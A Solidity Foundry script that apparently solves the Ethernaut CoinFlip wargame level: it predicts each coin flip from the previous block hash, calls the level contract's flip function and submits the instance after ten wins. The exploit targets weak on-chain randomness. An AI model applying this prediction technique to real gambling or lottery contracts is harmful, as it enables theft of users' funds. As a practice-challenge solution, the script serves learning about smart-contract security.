// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
// import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";
import {Ethernaut} from "src/Ethernaut.sol";
// import {HelperConfig} from "../HelperConfig.s.sol";
import {console} from "forge-std/Test.sol";
// import {SafeMath} from "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

contract ExecuteExploit is Script {
    // using SafeMath for uint256;

    address payable instance;
    address ethernaut;
    uint256 deployerKey;

    function run() external {
        console.log("Using same instance");
        string memory root = vm.projectRoot();
        string memory path =
            string.concat(root, "/broadcast/CoinFlip.s.sol/", Strings.toString(block.chainid), "/run-latest.json");
        uint256 index = 1;
        Receipt memory receipt = readReceipt(path, index);
        console.log(receipt.to);
        instance = payable(receipt.to);
        ethernaut = address(Ethernaut(vm.envAddress("ETHERNAUT_SEPOLIA_ADDRESS")));
        deployerKey = block.chainid == 11155111
            ? vm.envUint("PRIVATE_KEY")
            : uint256(bytes32(abi.encodePacked(makeAddr("Player"))));

        vm.startBroadcast(deployerKey);

        // Break the contract
        // uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // uint8 WINS_TO_COMPLETE_LEVEL = 10;
        uint256 blockValue;
        // bool side;
        uint256 coinFlip;
        // uint256 lastHash;

        // do {
        blockValue = uint256(blockhash(block.number - 1));
        // if (lastHash == blockValue) {
        //     console.log(CoinFlip(instance).consecutiveWins());
        //     return;
        // }
        coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // side = coinFlip == 1 ? true : false;
        // console.log(CoinFlip(instance).consecutiveWins());
        require(CoinFlip(instance).flip{gas: 0.1 ether}(coinFlip == 1), "guess failed");
        vm.roll(block.number + 1);
        // console.log("----------------------");
        // console.log(success);
        console.log(CoinFlip(instance).consecutiveWins());
        // if (!success) revert();
        // if (CoinFlip(instance).consecutiveWins() == 0) revert();
        // lastHash = blockValue;
        // } while (CoinFlip(instance).consecutiveWins() < WINS_TO_COMPLETE_LEVEL);

        // Submit results
        if (CoinFlip(instance).consecutiveWins() >= 10) {
            Ethernaut(ethernaut).submitLevelInstance(instance);
            (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
            require(completed == true, "Solution is not solving the level");
        }
        vm.stopBroadcast();
    }
}
